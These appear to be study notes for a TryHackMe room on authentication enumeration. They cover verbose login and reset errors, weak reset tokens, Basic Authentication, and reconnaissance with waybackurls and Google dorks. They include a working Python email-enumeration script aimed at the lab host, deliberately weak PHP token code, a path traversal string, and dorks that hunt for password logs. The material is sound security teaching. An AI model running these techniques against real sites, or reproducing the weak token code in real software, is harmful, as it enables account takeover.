# Authentication Enumeration

> **Authentication Enumeration** is the process of gathering information about a website's authentication system **without logging in**. Attackers analyze the application's responses to discover **valid usernames, password rules, and other useful information** that can help them perform future attacks like brute-force or password spraying.

---

# What is Authentication Enumeration?

Imagine you're a detective investigating a locked building.

You don't try to break the lock immediately.

Instead, you first observe:

* Who lives there?
* Which doors are used?
* How does the security system respond?
* Are there any weaknesses?

Authentication enumeration works exactly the same way.

Instead of attacking passwords immediately, an attacker collects information first.

This makes later attacks much easier and much more successful.

---

# Why is Authentication Enumeration Dangerous?

Without enumeration:

```
Attacker doesn't know:

❌ Valid usernames
❌ Password requirements
❌ Existing accounts
```

The attacker has to guess **both** username and password.

Example:

```
Username: ?
Password: ?
```

Huge number of combinations.

---

After enumeration:

```
Attacker already knows:

✔ Username = robert
```

Now they only need to guess:

```
Password = ?
```

The attack becomes much faster.

---

# What Information Can Attackers Discover?

Authentication enumeration usually helps attackers learn:

* Valid usernames
* Registered email addresses
* Password policy
* Existing accounts
* Login behavior
* Authentication logic

---

# 1. Identifying Valid Usernames

One of the most valuable pieces of information is knowing **whether a username exists**.

Suppose a login page behaves like this:

Input:

```
Username: john
Password: anything
```

Response:

```
Incorrect password.
```

This tells the attacker:

```
✔ Username exists
```

---

Now try another username:

```
Username: michael
Password: anything
```

Response:

```
Account doesn't exist.
```

Now the attacker learns:

```
❌ michael is not a valid user
```

---

## Why is this bad?

Instead of guessing millions of usernames, the attacker now has a list of real users.

They only need to crack passwords.

---

# Example

Login:

```
Username: robert
Password: hello123
```

Website:

```
Incorrect password.
```

Attacker thinks:

```
Great!

Robert exists.
Now I'll keep attacking only Robert's password.
```

---

# 2. Password Policies

Many websites tell users why their password is invalid.

For example:

```
Password must contain:

✔ One uppercase letter
✔ One number
✔ One symbol
```

This helps normal users.

Unfortunately...

It also helps attackers.

---

## Example PHP Code

```php
$password = $_POST['pass'];

$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/';

if (preg_match($pattern, $password)) {
    echo "Password is valid.";
} else {
    echo "Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.";
}
```

---

## What does this Regex Mean?

```regex
^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$
```

Let's break it down.

---

### `(?=.*[A-Z])`

Means:

```
Password must contain
at least one uppercase letter.
```

Example:

```
Hello123!
```

Uppercase letter:

```
H
```

---

### `(?=.*\d)`

Means:

```
Password must contain
at least one digit.
```

Example:

```
Hello123!
```

Digits:

```
123
```

---

### `(?=.*[\W_])`

Means:

```
Password must contain
at least one special symbol.
```

Examples:

```
!
@
#
$
%
&
*
_
```

Example:

```
Hello123!
```

Special character:

```
!
```

---

## Why is this useful for attackers?

Suppose the website says:

```
Password must contain:

Uppercase
Number
Symbol
```

The attacker immediately knows:

```
Passwords will probably look like:

Summer2025!

Welcome@123

Admin#2024
```

Instead of trying:

```
hello

password

abc123
```

They generate smarter password lists.

---

# Common Places Where Enumeration Happens

Many websites accidentally leak information through everyday features.

---

# 1. Registration Pages

When creating an account, websites usually check whether the username already exists.

Example:

You enter:

```
Username: robert
```

Website says:

```
Username already exists.
```

What does this tell the attacker?

```
✔ Robert has an account.
```

---

Now try:

```
Username: hacker123
```

Website says:

```
Username available.
```

Meaning:

```
❌ No such user.
```

---

## Visual Example

```
Register

Username: robert

↓

Username already taken.
```

Attacker:

```
Nice.

Robert exists.
```

---

# 2. Password Reset Pages

Password reset pages are another common source of information.

Example:

```
Forgot Password

Enter Email:
```

User enters:

```
robert@gmail.com
```

Website says:

```
Reset link sent.
```

---

Now attacker tries:

```
unknown@gmail.com
```

Website says:

```
Account not found.
```

Now the attacker knows:

```
✔ Robert has an account.
❌ Unknown user doesn't.
```

---

## Better Design

Instead of revealing whether the account exists, websites should always respond with something like:

```
If the account exists,
a password reset link has been sent.
```

This response looks the same whether the account exists or not.

---

# 3. Verbose Error Messages

Verbose means:

> Giving **too much information**.

Example:

Bad login system:

```
Username not found.
```

or

```
Incorrect password.
```

This tells attackers exactly what's wrong.

---

## Example

Input:

```
Username: admin
Password: test
```

Response:

```
Incorrect password.
```

Attacker learns:

```
✔ admin exists
```

---

Input:

```
Username: john123
Password: test
```

Response:

```
Username not found.
```

Attacker learns:

```
❌ john123 doesn't exist
```

---

## Secure Version

Instead, websites should always display:

```
Invalid username or password.
```

No clues.

---

# 4. Data Breach Information

Sometimes attackers don't even need to guess usernames.

They use information stolen from previous data breaches.

Example breach:

```
Email:
robert@gmail.com

Password:
Football@123
```

Later they visit another website.

They try:

```
Username:
robert@gmail.com

Password:
Football@123
```

If the user reused the same password:

```
Login successful.
```

This is called **credential reuse** or **credential stuffing**.

---

## Why is Password Reuse Dangerous?

Many users use the same password everywhere.

Example:

```
Facebook:
Football@123

Netflix:
Football@123

Amazon:
Football@123

Bank:
Football@123
```

One breach can compromise many accounts.

---

# Real Attack Flow

```
Step 1
↓

Collect usernames
(Login errors)

↓

Step 2

Password reset page

↓

Confirm valid users

↓

Step 3

Read password policy

↓

Generate matching password list

↓

Step 4

Use leaked credentials
(from previous breaches)

↓

Step 5

Brute-force only valid accounts

↓

Higher chance of success
```

----------------------

# Understanding Verbose Errors

> **Verbose errors** are **detailed error messages** that reveal too much information about how an application works. While they help developers debug issues, they can also help attackers gather valuable information for future attacks.

---

# What are Verbose Errors?

Imagine you try to log into a website.

Instead of showing a simple message like:

```text
Invalid username or password.
```

The website displays:

```text
User "john" exists.
Password is incorrect.

Database: users_db
Table: accounts
File: /var/www/html/login.php
```

This is a **verbose error**.

It gives away information that attackers should never see.

---

# Why are Verbose Errors Dangerous?

Verbose errors can reveal:

* Internal server file paths
* Database names
* Table names
* Column names
* Valid usernames or email addresses
* Application logic
* Password policy
* Hidden backend information

Instead of hacking blindly, attackers now have clues to guide their attacks.

---

# Information Leaked by Verbose Errors

## 1. Internal Paths

### What are Internal Paths?

These are the folders and files where the website is stored on the server.

Example:

```text
/var/www/html/login.php
```

or

```text
C:\xampp\htdocs\login.php
```

---

### Why is this dangerous?

Knowing the folder structure helps attackers:

* Find sensitive files
* Locate configuration files
* Discover backup files
* Plan Path Traversal attacks

---

### Example

Instead of:

```text
Something went wrong.
```

The website shows:

```text
Fatal Error

File:
/var/www/html/config/database.php

Line 54
```

Now the attacker knows:

* The server uses Linux.
* The configuration file exists.
* Where sensitive files are stored.

---

## 2. Database Details

Sometimes SQL errors expose database information.

Example:

```text
SQL Error

Unknown column 'passwords'

Table: users

Database: shop_db
```

Now the attacker knows:

* Database name = `shop_db`
* Table name = `users`
* Column names

This makes SQL Injection attacks much easier.

---

## 3. User Information

Some websites reveal whether a username or email exists.

Example:

```text
Email exists.
Wrong password.
```

or

```text
User does not exist.
```

The attacker immediately learns which accounts are real.

---

# How Do Attackers Trigger Verbose Errors?

Attackers intentionally send unexpected or malicious input to make the application reveal information.

---

# 1. Invalid Login Attempts

The attacker enters incorrect credentials.

Example:

```text
Email:
john@gmail.com

Password:
123456
```

Response:

```text
Invalid password.
```

This means:

```text
✔ Email exists.
```

---

Try another email:

```text
admin@gmail.com
```

Response:

```text
Email does not exist.
```

Now the attacker knows:

```text
❌ admin@gmail.com isn't registered.
```

---

# Why is this dangerous?

The attacker can build a list of valid users before trying passwords.

---

# 2. SQL Injection

Attackers insert SQL characters into input fields to see if the application leaks database information.

Example input:

```text
'
```

(single quote)

If the application doesn't handle it properly, it may display an SQL error such as:

```text
SQL syntax error near '
```

This reveals that the application is interacting with an SQL database and may expose database details.

> **Note:** On systems you don't own or have permission to test, attempting SQL injection is unauthorized. In labs like TryHackMe, it's safe because the environment is designed for learning.

---

# 3. File Inclusion / Path Traversal

Attackers manipulate file paths.

Example input:

```text
../../../../etc/passwd
```

If the application returns an error like:

```text
Cannot open

/var/www/html/uploads/file.php
```

The attacker now learns the server's directory structure.

---

# 4. Form Manipulation

Many websites contain hidden form fields.

Example:

```html
<input type="hidden" name="role" value="user">
```

An attacker may change values or remove required fields to see how the application reacts.

If the application responds with detailed validation errors, it may reveal:

* Backend validation rules
* Expected data formats
* Internal field names

---

# 5. Application Fuzzing

## What is Fuzzing?

Fuzzing means sending many different inputs to an application to see how it behaves.

Examples:

* Long strings
* Empty values
* Special characters
* Unexpected numbers
* Invalid formats

Attackers look for responses that reveal useful information.

Common tools used in authorized security testing include:

* Burp Suite Intruder
* ffuf
* wfuzz

---

# Enumeration + Brute Force

These two techniques are often used together.

---

## Step 1 – User Enumeration

First, find valid usernames.

Example:

```text
john@gmail.com ✔

alice@gmail.com ✔

fake@gmail.com ✘
```

---

## Step 2 – Study Verbose Errors

The website reveals:

```text
Password must contain:

Uppercase

Number

Symbol
```

Now the attacker knows how passwords are likely formatted.

---

## Step 3 – Brute Force

Instead of guessing everything, the attacker only tries passwords for **valid accounts** using passwords that match the site's policy.

This is much more efficient than guessing usernames and passwords at random.

# Example: Email Enumeration

Imagine a login page.

### Invalid Email

Input:

```text
Email:
unknown@gmail.com
```

Response:

```text
Email does not exist.
```

Meaning:

```text
 Not registered.
```

---

### Valid Email

Input:

```text
john@gmail.com
```

Response:

```text
Invalid password.
```

Meaning:

```text
✔ Email exists.
```

Even though login failed, the attacker has learned that the account is real.

---------------

# Objective

The goal of this lab is to **identify which email addresses are registered** by observing the login page's error messages.

The website behaves like this:

| Email Status         | Response               |
| -------------------- | ---------------------- |
| Email does NOT exist | `Email does not exist` |
| Email exists         | `Invalid password`     |

Since the responses are different, we can determine whether an email is registered.


# Step 1: Start the Machine

Start the TryHackMe machine and wait until it is ready.

# Step 2: Open the Lab

Visit:

```text
http://enum.thm/labs/verbose_login/
```

You should see a login page.

# Step 3: Test Manually

First, understand the vulnerability manually.

### Try any random email

```text
Email:
abcdef@gmail.com

Password:
123456
```

Click **Login**.

You will probably get

```text
Email does not exist
```

Now try another email (if you know one from the lab).

If it exists, you'll receive

```text
Invalid password
```

This difference is the vulnerability.


# Step 4: Create a Python File

Open a terminal.

Create a new file.

```bash
nano script.py
```

Paste the following code exactly.

```python
import requests
import sys

def check_email(email):
    url = "http://enum.thm/labs/verbose_login/functions.php"

    headers = {
        "Host": "enum.thm",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://enum.thm",
        "Referer": "http://enum.thm/labs/verbose_login/"
    }

    data = {
        "username": email,
        "password": "password",
        "function": "login"
    }

    response = requests.post(url, headers=headers, data=data)

    return response.json()


def enumerate_emails(email_file):

    valid_emails = []

    invalid_error = "Email does not exist"

    with open(email_file, "r") as file:
        emails = file.readlines()

    for email in emails:

        email = email.strip()

        if email:

            response = check_email(email)

            if response["status"] == "error" and invalid_error in response["message"]:

                print(f"[INVALID] {email}")

            else:

                print(f"[VALID] {email}")

                valid_emails.append(email)

    return valid_emails


if __name__ == "__main__":

    if len(sys.argv) != 2:

        print("Usage: python3 script.py <email_file>")

        sys.exit(1)

    email_file = sys.argv[1]

    valid = enumerate_emails(email_file)

    print("\nValid Emails Found:")

    for email in valid:

        print(email)
```

---

# Step 5: Save the File

Press

```
CTRL + O
```

Press

```
Enter
```

Then

```
CTRL + X
```

# Step 6: Download the Email Wordlist

Download the email list provided by TryHackMe (or use the one linked in the room).

For example, your directory might look like this:

```text
script.py

usernames_gmail.com.txt
```

Check with:

```bash
ls
```

Example output

```text
script.py
usernames_gmail.com.txt
```

---

# Step 7: Install Requests (if needed)

Check whether the `requests` module is installed:

```bash
python3 -c "import requests"
```

If no error appears, you're good to go.

If you see:

```text
ModuleNotFoundError
```

Install it:

```bash
pip3 install requests
```

> On the TryHackMe AttackBox, `requests` is usually already installed.

---

# Step 8: Run the Script

Run:

```bash
python3 script.py usernames_gmail.com.txt
```

---

# Step 9: What Happens Internally?

The script reads the first email.

Example:

```text
abc@gmail.com
```

↓

It sends

```http
POST /labs/verbose_login/functions.php
```

with

```text
username=abc@gmail.com

password=password

function=login
```

↓

The server replies

```json
{
  "status":"error",
  "message":"Email does not exist"
}
```

↓

The script prints

```text
[INVALID] abc@gmail.com
```

---

Then it checks the second email.

Suppose

```text
john@gmail.com
```

↓

The server replies

```json
{
  "status":"error",
  "message":"Invalid password"
}
```

↓

The script prints

```text
[VALID] john@gmail.com
```

---

The process repeats until every email in the file has been tested.

---

# Step 10: Example Output

```text
[INVALID] abc@gmail.com
[INVALID] xyz@gmail.com
[INVALID] test@gmail.com
[VALID] john@gmail.com
[VALID] alice@gmail.com

Valid Emails Found:

john@gmail.com
alice@gmail.com
```

---

# How the Script Works (Flow Diagram)

```text
Read email list
        │
        ▼
Take first email
        │
        ▼
Send POST request
        │
        ▼
Receive JSON response
        │
        ▼
Contains "Email does not exist"?
        │
   ┌────┴────┐
   │         │
  Yes        No
   │         │
   ▼         ▼
INVALID    VALID
             │
             ▼
Add to valid_emails list
             │
             ▼
Next email
             │
             ▼
Repeat until file ends
```

-----------------
# Password Reset Flow Vulnerabilities

> **Password Reset Flow Vulnerabilities** are weaknesses in a website's password reset process that attackers can exploit to take over user accounts. If the reset mechanism is poorly designed, attackers may reset another user's password without knowing the original password.

# What is a Password Reset Flow?

A password reset flow is the process that allows users to recover access to their account if they forget their password.

Typical flow:

```text
User forgets password
        ↓
Clicks "Forgot Password"
        ↓
Enters registered email/phone
        ↓
Website sends a reset link or code
        ↓
User verifies identity
        ↓
Creates a new password
        ↓
Logs in with the new password
```

---

# Common Password Reset Methods

## 1. Email-Based Reset

This is the **most common** password reset method.

### How it Works

```text
User clicks "Forgot Password"
        ↓
Enters email address
        ↓
Website sends a reset link/token
        ↓
User clicks the link
        ↓
Creates a new password
```

### Example

```
Email:
john@gmail.com
```

Website sends:

```text
https://example.com/reset?token=AB12CD34
```

The token proves that the user owns the email account.

### Advantages

* Easy to use
* Widely supported
* No need to remember security questions

### Risks

* Email account is compromised
* Reset token is predictable
* Reset link is intercepted
* Token expires too late

---

# 2. Security Question-Based Reset

Instead of sending a link, the website asks questions.

Example:

```text
What is your first pet's name?

What is your mother's maiden name?

What city were you born in?
```

Correct answers allow the password to be reset.

---

## Why is this risky?

Many answers can be:

* Found on social media
* Guessed
* Learned from previous data breaches
* Shared publicly

Example:

Instagram:

```
Happy Birthday to my dog Bruno ❤️
```

Security Question:

```
First pet?

Answer:
Bruno
```

The attacker now knows the answer.

---

# 3. SMS-Based Reset

Instead of email, the website sends a code via SMS.

Example:

```
Your OTP is:

482913
```

User enters the code.

If correct:

```
Password Reset Page Opens
```

---

## Advantages

* Requires access to the user's phone
* Convenient

---

## Risks

### SIM Swapping

An attacker convinces the mobile carrier to transfer the victim's phone number to a new SIM card.

Now all SMS codes go to the attacker instead of the real owner.

---

# Common Password Reset Vulnerabilities

# 1. Predictable Tokens

## What is a Token?

A token is a **temporary secret value** used to verify that the password reset request is legitimate.

Example:

```
Reset Link

https://example.com/reset?token=A82B91C7
```

The token should be:

* Random
* Long
* Hard to guess

---

## Vulnerable Example

```php
$token = mt_rand(100,200);
```

### What does this do?

It generates a random number between:

```
100

↓

200
```

Possible values:

```
100
101
102
103

...

199
200
```

Only **101 possible tokens** exist.

---

## Why is this bad?

An attacker can simply try every value.

Instead of guessing billions of combinations:

```
100

101

102

...

200
```

Eventually one will work.

---

# Example

Victim requests a password reset.

Website creates:

```
Token = 143
```

Reset link:

```
https://example.com/reset?token=143
```

An attacker tries:

```
100

101

102

...

143

✔ Success
```

The attack succeeds because the token space is very small.

---

# 2. Token Expiration Issues

A reset token should expire quickly.

Good example:

```
Valid for:

10 minutes
```

Bad example:

```
Valid for:

7 days
```

If someone steals the link during those 7 days, they can still reset the password.

---

# 3. Insufficient Validation

The website doesn't properly verify the user's identity.

Example:

```
Security Question:

Favorite color?
```

Answer:

```
Blue
```

Many questions have answers that are easy to guess or discover.

---

# 4. Information Disclosure

Suppose the password reset page says:

```
Email exists.
Reset link sent.
```

For another email:

```
Email not found.
```

Now attackers know which email addresses are registered.

This is another form of **user enumeration**.

---

# Better Design

Instead of different messages:

Always show:

```
If the account exists,
a reset link has been sent.
```

The response looks the same whether the account exists or not.

---

# 5. Insecure Transport

Suppose the reset link is sent over HTTP.

```
http://example.com/reset?token=ABCD1234
```

Notice:

```
HTTP

 Not encrypted
```

Someone on the network may intercept the request.

Instead use:

```
https://example.com/reset?token=ABCD1234
```

```
HTTPS

✔ Encrypted
```

---

# Understanding the Vulnerable PHP Code

```php
$token = mt_rand(100, 200);

$query = $conn->prepare("UPDATE users SET reset_token = ? WHERE email = ?");

$query->bind_param("ss", $token, $email);

$query->execute();
```

Let's understand each line.

---

## Line 1

```php
$token = mt_rand(100,200);
```

Generates a random number between:

```
100

↓

200
```

Problem:

Only 101 possible values.

Very easy to guess.

---

## Line 2

```php
$query = $conn->prepare(...)
```

Creates a SQL query.

The query says:

```
UPDATE users

SET reset_token = ?

WHERE email = ?
```

Meaning:

Update the selected user's reset token in the database.

---

## Line 3

```php
$query->bind_param("ss",$token,$email);
```

This safely inserts:

* Token
* Email

into the SQL query.

---

## Line 4

```php
$query->execute();
```

Runs the SQL query.

Now the database stores:

```
Email

↓

admin@admin.com

↓

Reset Token

↓

143
```

---

# TryHackMe Lab Walkthrough

---

## Step 1

Open the password reset page.

```
Forgot Password
```

---

## Step 2

Enter:

```
admin@admin.com
```

---

## Step 3

Website replies:

```
Password reset link has been sent.
```

---

## Step 4

The lab uses a reset URL like:

```
http://enum.thm/labs/predictable_tokens/reset_password.php?token=123
```

Notice:

```
Token = 123
```

It is only a three-digit number.

---

# Why is this Vulnerable?

Possible tokens:

```
100

101

102

...

200
```

Only 101 possibilities.

An attacker can simply test every one until the correct token is found.

---

# Why Use Crunch?

**Crunch** is a wordlist generator.

It creates lists of numbers, words, or character combinations.

In this lab, it is used to generate every possible three-digit token between **100** and **200**.

Example output:

```
100
101
102
103
...
200
```

These values can then be supplied to an authorized testing tool to check each possible token in the lab.

---

# Attack Flow (Lab Concept)

```text
Victim requests password reset

↓

Website generates

Token = 143

↓

Attacker knows

Possible tokens are

100–200

↓

Generate every possible value

↓

Test each value in the lab

↓

Correct token found

↓

Password reset page opens

↓

Password changed

↓

Account compromised
```

---

# Why Does the Lab Use Only 3 Digits?

Real websites usually use:

```
6-digit OTP

or

Long random tokens
```

The lab intentionally uses a **small token range** so students can demonstrate the concept quickly in a safe training environment.

--------------
# Basic Authentication in 2024 

> **HTTP Basic Authentication** is one of the simplest authentication methods used on the web. It requires only a **username and password**, which are combined, Base64-encoded, and sent in the HTTP `Authorization` header.

> **Important:** The discussion below explains how Basic Authentication works and why weak credentials are risky. Any password testing or brute-force activity should only be performed in **authorized lab environments** like TryHackMe or on systems you have permission to test.

---

# What is Basic Authentication?

Basic Authentication is an HTTP authentication scheme where the client sends:

* Username
* Password

to the server with every request.

Unlike modern authentication methods, there are:

* No sessions
* No JWT tokens
* No OAuth
* No cookies required for authentication

Every request includes the credentials again.

---

# Why is it called "Basic"?

Because it is:

* Simple
* Easy to implement
* Supported by almost every browser
* Built into the HTTP protocol

---

# Where is Basic Authentication Used?

Although modern websites mostly use session or token-based authentication, Basic Authentication is still common on:

* Routers
* Switches
* Firewalls
* IP Cameras
* NAS devices
* Printer web interfaces
* Internal admin panels
* APIs (especially for simple integrations)

Example:

```text
Router Login

Username:
admin

Password:
*******
```

---

# How Basic Authentication Works

## Step 1

User opens a protected page.

```
http://example.com/admin
```

---

## Step 2

Server responds:

```http
HTTP/1.1 401 Unauthorized

WWW-Authenticate: Basic realm="Admin Area"
```

Meaning:

> "You must authenticate before accessing this page."

---

## Step 3

The browser shows a login popup.

```
Username:
_________

Password:
_________
```

---

## Step 4

User enters:

```
Username:
admin

Password:
password123
```

---

## Step 5

The browser combines them.

```
admin:password123
```

Notice the format:

```
username:password
```

Always separated by a colon (`:`).

---

## Step 6

The combined string is **Base64 encoded**.

Example:

```
admin:password123
```

↓

```
YWRtaW46cGFzc3dvcmQxMjM=
```

---

## Step 7

The browser sends the HTTP request.

```http
GET /admin HTTP/1.1
Host: example.com

Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

---

## Step 8

Server decodes the Base64 value.

```
YWRtaW46cGFzc3dvcmQxMjM=
```

↓

```
admin:password123
```

---

## Step 9

Server checks the credentials.

If correct:

```http
HTTP/1.1 200 OK
```

If incorrect:

```http
HTTP/1.1 401 Unauthorized
```

---

# Authentication Flow

```text
User

↓

Enter Username & Password

↓

Browser

↓

Combine

admin:password123

↓

Base64 Encode

↓

Authorization Header

↓

Server

↓

Decode Base64

↓

Compare Credentials

↓

Access Granted or Denied
```

---

# What is Base64?

Base64 is **an encoding method**, **not encryption**.

It converts data into readable ASCII characters for safe transmission.

Example:

```
Original

admin:password
```

↓

```
Base64

YWRtaW46cGFzc3dvcmQ=
```

Anyone can decode it back.

---------------

# Wayback URLs and Google Dorks

> **Wayback URLs** and **Google Dorks** are **reconnaissance (information gathering)** techniques used during authorized security assessments. They help discover publicly available information about a website, such as old pages, hidden directories, backup files, or exposed resources.

> **Important:** These techniques should only be used on systems you own or have permission to test.

---

# Why Use These Techniques?

Before testing a website, security professionals gather as much **public information** as possible.

This helps answer questions like:

* What pages existed before?
* Are old files still accessible?
* Are backup files exposed?
* Are there forgotten admin pages?
* Has sensitive information been accidentally indexed?

---

# 1. Wayback Machine

## What is the Wayback Machine?

The **Wayback Machine** is an Internet archive that stores snapshots of websites from different points in time.

Think of it as a **time machine for websites**.

Example:

```text
Website Today

↓

https://example.com
```

Current homepage:

```
Home
About
Contact
```

---

Five years ago it might have looked like:

```
Home
Admin
Backup
Old Login
Test Page
```

Even if those pages are no longer linked today, archived copies may still exist.

---

# Why is this Useful?

Suppose a company removes:

```text
/admin
```

from its website.

It disappears from the homepage.

However, the archived version still shows:

```text
https://example.com/admin
```

A security tester can investigate whether that page still exists or whether the application has changed over time.

---

# What Can the Wayback Machine Reveal?

It may contain archived references to:

* Old pages
* Deprecated APIs
* Login pages
* Admin panels
* Backup files
* Old JavaScript files
* Images
* Documentation

---

# Visual Example

```text
2020 Website

↓

Home

Products

Admin

↓

Archived
```

---

```text
2024 Website

↓

Home

Products

Contact
```

Even though **Admin** is no longer linked, the archived version may still reference it.

---

# Wayback URLs Tool

Instead of manually browsing archives, a tool such as **waybackurls** can collect archived URLs for a domain.

Example command:

```bash
./waybackurls tryhackme.com
```

The tool queries archived records and outputs URLs that have been seen historically, such as:

```text
https://tryhackme.com/.well-known/security.txt

https://tryhackme.com/.well-known/openid-configuration

https://tryhackme.com/.well-known/assetlinks.json
```

These results help a tester understand what public resources have existed over time.

---

# Understanding the Installation Commands

```bash
git clone https://github.com/tomnomnom/waybackurls
```

Downloads the source code from GitHub.

---

```bash
cd waybackurls
```

Moves into the project directory.

---

```bash
sudo apt install golang-go -y
```

Installs the Go programming language (required to build the tool).

---

```bash
go build
```

Compiles the source code into an executable.

---

```bash
./waybackurls tryhackme.com
```

Runs the tool against the specified domain.

---

# Understanding the Output

Example:

```text
https://tryhackme.com/.well-known/security.txt
```

This indicates that the URL has been seen in archived records.

Other examples:

```text
.well-known/openid-configuration
```

Contains OpenID configuration for authentication.

---

```text
.well-known/security.txt
```

A file where organizations publish security contact information.

---

```text
.well-known/assetlinks.json
```

Used by Android applications for app–website association.

---

# Google Dorks

## What are Google Dorks?

Google Dorks are **advanced Google search operators** that help locate publicly indexed information more precisely.

They are useful for narrowing searches to specific websites, file types, page titles, or URLs.

---

# Why are Google Dorks Useful?

Instead of searching:

```text
example admin
```

You can use search operators to focus on a specific site or type of content.

For example, you can search for:

* Login pages
* PDF documents
* Public configuration files
* Backup folders
* Log files
* Other publicly indexed resources

---

# Common Google Search Operators

## 1. `site:`

Limits results to one website.

Example:

```text
site:example.com
```

Searches only pages from:

```text
example.com
```

---

## 2. `inurl:`

Searches for words appearing in the URL.

Example:

```text
site:example.com inurl:admin
```

Looks for URLs containing:

```text
admin
```

Possible results:

```text
example.com/admin

example.com/admin/login
```

---

## 3. `filetype:`

Searches for a specific file type.

Example:

```text
site:example.com filetype:pdf
```

Possible results:

```text
Employee Handbook.pdf

User Guide.pdf
```

---

## 4. `intitle:`

Searches for words in the page title.

Example:

```text
intitle:"index of"
```

This often finds directory listing pages that have been indexed by search engines.

---

# Understanding the Examples from TryHackMe

### Example 1

```text
site:example.com inurl:admin
```

Meaning:

| Part     | Meaning                  |
| -------- | ------------------------ |
| `site:`  | Search only this domain  |
| `inurl:` | URL must contain `admin` |

Possible result:

```text
example.com/admin
```

---

### Example 2

```text
filetype:log "password" site:example.com
```

Meaning:

| Part           | Meaning                          |
| -------------- | -------------------------------- |
| `filetype:log` | Search for log files             |
| `"password"`   | Must contain the word "password" |
| `site:`        | Restrict to the chosen domain    |

This query is intended to locate **publicly indexed log files** that mention the word "password" on the specified site.

---

### Example 3

```text
intitle:"index of" "backup" site:example.com
```

Meaning:

| Part                 | Meaning                            |
| -------------------- | ---------------------------------- |
| `intitle:"index of"` | Search for directory listing pages |
| `"backup"`           | Directory name contains "backup"   |
| `site:`              | Limit to the target domain         |

This helps identify **publicly accessible backup directories** that have been indexed.

---

# Comparison

| Wayback Machine                         | Google Dorks                                   |
| --------------------------------------- | ---------------------------------------------- |
| Shows archived versions of websites.    | Searches the current Google index.             |
| Reveals historical pages and URLs.      | Finds currently indexed public resources.      |
| Useful for discovering removed content. | Useful for discovering exposed public content. |

---

# Typical Reconnaissance Workflow

```text
Choose Target

↓

Check Wayback Machine

↓

Collect Historical URLs

↓

Search with Google Operators

↓

Identify Public Resources

↓

Review Findings

↓

Use Information During an Authorized Security Assessment
```

---

